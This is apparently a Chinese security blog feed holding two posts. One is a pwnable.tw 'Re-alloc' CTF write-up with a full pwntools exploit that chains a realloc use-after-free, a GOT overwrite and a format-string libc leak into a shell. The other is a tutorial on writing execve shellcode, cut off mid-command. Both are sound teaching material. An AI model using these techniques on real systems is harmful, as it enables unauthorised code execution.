class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  v2 = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> || heap[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Invalid !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size:"</span>, v2);</span><br><span class="line">    <span class="built_in">size</span> = read_long();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">realloc</span>(<span class="number">0L</span>L, <span class="built_in">size</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[v3] = v5;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Data:"</span>, <span class="built_in">size</span>);</span><br><span class="line">        v0 = (<span class="keyword">char</span> *)heap[v3] + read_input(heap[v3], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">size</span>);</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"alloc error"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Too large!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先读取index为long型，且值只能为0或1，size必须&lt;=0x78，此处realloc就相当于malloc，然后读取data并在最后置零</p><h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reallocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v1 = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  <span class="built_in">size</span> = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x78</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too large!"</span>);</span><br><span class="line">  v3 = <span class="built_in">realloc</span>(heap[v1], <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"alloc error"</span>);</span><br><span class="line">  heap[v1] = v3;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> read_input((__int64)heap[v1], <span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编号，大小，数据，也很正常</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rfree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v2 = read_long();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Invalid !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">realloc</span>(heap[v2], <span class="number">0L</span>L);</span><br><span class="line">    v0 = heap;</span><br><span class="line">    heap[v2] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样使用realloc()函数进行free操作，并对指针清零</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>程序的 <code>rfree</code> 函数做了清空指针操作，看似杜绝了 UAF ，实际上在 <code>reallocate</code> 函数中调用 <code>realloc</code> 时，将其参数 size 置为 0，就等效于调用了 <code>free(ptr)</code>，且此时是没有清空 heap[2] 数组中的指针的。由此造成 UAF。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于程序的 got 表可写，故思路为：通过修改某参数为可控内容的内存指针的函数的 got 表项为 system 函数地址，传入 <code>&quot;/bin/sh\x00&quot;</code> 即可 get shell。</p><ul><li>利用上述 UAF 漏洞，在两处 tcache 项上放置 atoll@got ，准备对其进行篡改</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UAF 放置 atoll@got 至 tcache@0x20</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">"atoll"</span>])) <span class="comment"># 由于 realloc 函数中 ptr 指向 tcache free chunk 时，其不会将该 chunk 从 tcache 中取出 [1]，故此处相当于 edit 功能 </span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清零 heap[0]、heap[1]，以进行第二次放置</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"s"</span>*<span class="number">0x10</span>) <span class="comment"># 因为[1]处原因，且 rfree 也由 realloc 实现，故此处需要将 fd 与 key 都覆盖为垃圾数据，确保 key 被修改以绕过 double free 检查</span></span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>第二次放置也一样</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># UAF 放置 atoll@got 至 tcache@0x40 </span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"AAA"</span>) </span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>) </span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(elf.got[<span class="string">"atoll"</span>])) <span class="comment"># 由于 realloc 函数中 ptr 指向 tcache free chunk 时，其不会将该 chunk 从 tcache 中取出，故此处相当于 edit 功能  alloc(1, 0x38, "BBB") </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 清零 heap[0]、heap[1]，以进行接下来的利用 </span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"CCC"</span>) </span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"s"</span>*<span class="number">0x10</span>) <span class="comment"># 因为[1]处原因，且 rfree 也由 realloc 实现，故此处需要将 fd 与 key 都覆盖为垃圾数据，确保 key 被修改以绕过 double free 检查 </span></span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><p>利用其中一个指向<code>atoll_got</code>的 chunk 更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以 leak 出栈上的libc地址，这里选择 leak<code>__libc_start_main</code><br>补充：这里利用格式化字符串的常量为调试所得，例如%21$llx，例如0xeb（即235）因为获得的地址是&lt;__libc_start_main+235&gt;</p></li><li><p>利用另一个指向<code>atoll_got</code>的 chunk 将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用 alloc 时，需要输入的 Index 和 Size 不是直接输入数字，而是通过输入的 string 的长度来通过 printf 返回的值间接传给Index和Size。</p></li><li><p>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>即可 get shell。</p></li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./re-alloc"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-realloc.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./re-alloc"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-realloc.so"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10106</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">"atoll"</span>]))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"s"</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(elf.got[<span class="string">"atoll"</span>]))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"BBB"</span>)</span><br><span class="line"> </span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"s"</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(elf.plt[<span class="string">"printf"</span>]))</span><br><span class="line">free(<span class="string">"%21$llx"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = int(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret - libc.symbols[<span class="string">"__libc_start_main"</span>] - <span class="number">0xeb</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">success(<span class="string">"system address: "</span> + hex(system_addr))</span><br><span class="line">    </span><br><span class="line">sla(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">sla(<span class="string">"Index:"</span>, <span class="string">"A\x00"</span>)</span><br><span class="line">sa(<span class="string">"Size:"</span>, <span class="string">"A"</span>*<span class="number">15</span>+<span class="string">"\x00"</span>)</span><br><span class="line">sa(<span class="string">"Data:"</span>, p64(system_addr))</span><br><span class="line">free(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://zhangyidong.top/2020/10/19/Pwnable_re-alloc/" target="_blank" rel="noopener">Pwmable.tw Re-alloc</a></li><li><a href="http://izayoi.cn/index.php/2020/07/04/pwnable-tw-re-alloc/" target="_blank" rel="noopener">pwnable.tw Re-alloc</a></li><li><a href="https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/#get-shell" target="_blank" rel="noopener">pwnable.tw re-alloc</a></li><li><a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">pwnable.tw re-alloc_revenge</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何编写一个shellcode</title>
      <link href="2020/11/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAshellcode/"/>
      <url>2020/11/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAshellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="如何编写一个shellcode"><a href="#如何编写一个shellcode" class="headerlink" title="如何编写一个shellcode"></a>如何编写一个shellcode</h2><p>如果我们想要从一个程序中获取系统的shell，便需要我们当前的进程创建一个全新的进程，来让我们可以与系统直接进行交互。</p><blockquote><p>什么是shell？</p><p>简而言之，就是用户和linux内核之间的接口程序，用户（即我）输入的每个命令都由shell先解释后传给linux内核</p></blockquote><p>而在linux中，有两种方法创建新进程：一是通过现有的进程来创建，并替换正在活动的；二是利用现有的进程来生成它自己的拷贝，并在它的位置运行这个新进程。而execve()系统调用就是在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。</p><p>系统调用在linux中一般通过指令<code>int 0x80</code>来实现，而软中断以后，会在eax中读取系统调用号，调用相对应的函数，当系统调用参数小于等于6个时，参数按顺序放在ebx，ecx，edx，esi，edi，ebp中</p><p>大于6个时，全部参数应存在一块连续的内存空间里，同时在寄存器ebx中保存指向该内存区域的指针</p><h2 id="64位shellcode"><a href="#64位shellcode" class="headerlink" title="64位shellcode"></a>64位shellcode</h2><p>64位系统中的系统调用编号在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>，我们使用以下命令查找execve的系统编号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h | grep execve</span><br><span class="line">#define __NR_execve 59</span><br></pre></td></tr></table></figure><p>可得execve的系统调用号是59即0x3b</p><p>调用execve需要传入三个参数，分别是新打开的应用或者脚本的路径、参数的字符串数组argv（最后一个元素是NULL）、环境变量的字符串数组envp（最后一个元素是NULL）<code>execve(&quot;/bin/sh&quot;, NULL, NULL);</code>。</p><p>64位中当系统调用参数小于等于6个时，参数按顺序放在rdi，rsi，rdx，r10，r8，r9中</p><p>大于6个时，全部参数应存在一块连续的内存空间里，同时在寄存器ebx中保存指向该内存区域的指针</p><p>我们用汇编语言编写，测试环境是64位ubuntu16.04，这里我们读取/bin/sh字符串并加上0xff给寄存器rbx，然后右移8位去除（因为shellcode里面不能有0x00？我自己测试有0x00会无限失败），然后将rbx内容push到栈中，并把地址传给第一个参数rdi，把rdx和rsi清零，给rax赋予0x3b操作值</p><p>需要注意的是由于是小端，这里传入的是倒着的/bin/sh </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'/bin/sh'</span>[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'68732f6e69622f'</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;test.s</span><br><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">mov rbx, 0x68732f6e69622fff</span><br><span class="line">shr rbx, 0x8</span><br><span class="line">push rbx</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rax, rax</span><br><span class="line">xor rsi, rsi</span><br><span class="line">mov al, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>使用汇编编译工具NASM编译，因为是在64位系统中，需要指定elf64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install nasm</span><br><span class="line">$ nasm -f elf64 test.s</span><br><span class="line">$ ld test.o -o test</span><br></pre></td></tr></table></figure><p>使用以下命令提取shellcode</p><p>获得字符串形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s test</span><br></pre></td></tr></table></figure><p>然后放入python文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">'48bbff2f62696e2f736848c1eb08534889e74831d24831c04831f6b03b0f05'</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(code), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; len(code) - <span class="number">1</span>:</span><br><span class="line">        result += <span class="string">'\\x'</span> + code[i:i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'\\x'</span> + code[i]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>运行即可获得shellcode</p><p>然后我们使用c语言来验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> *shellcode = <span class="string">"\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Length: %d\n"</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">(*(<span class="keyword">void</span>(*)()) shellcode)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o s1 s1.c</span><br></pre></td></tr></table></figure><p>运行即可get shell</p><h2 id="32位shellcode"><a href="#32位shellcode" class="headerlink" title="32位shellcode"></a>32位shellcode</h2><p>32位下使用int 80，execve的中断号是11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;test32.s</span><br><span class="line">Section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    push eax</span><br><span class="line">    push 0x68732f6e</span><br><span class="line">    push 0x69622f2f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    push eax</span><br><span class="line">    mov edx, esp</span><br><span class="line">    push ebx</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf test32.s</span><br><span class="line">$ ld -m elf_i386 -s -o test32 test32.o</span><br></pre></td></tr></table></figure><p>利用以下命令可获取shellcode（在64位下会失败，少读取字节，还是建议用上文中的py脚本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d .&#x2F;test32|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed 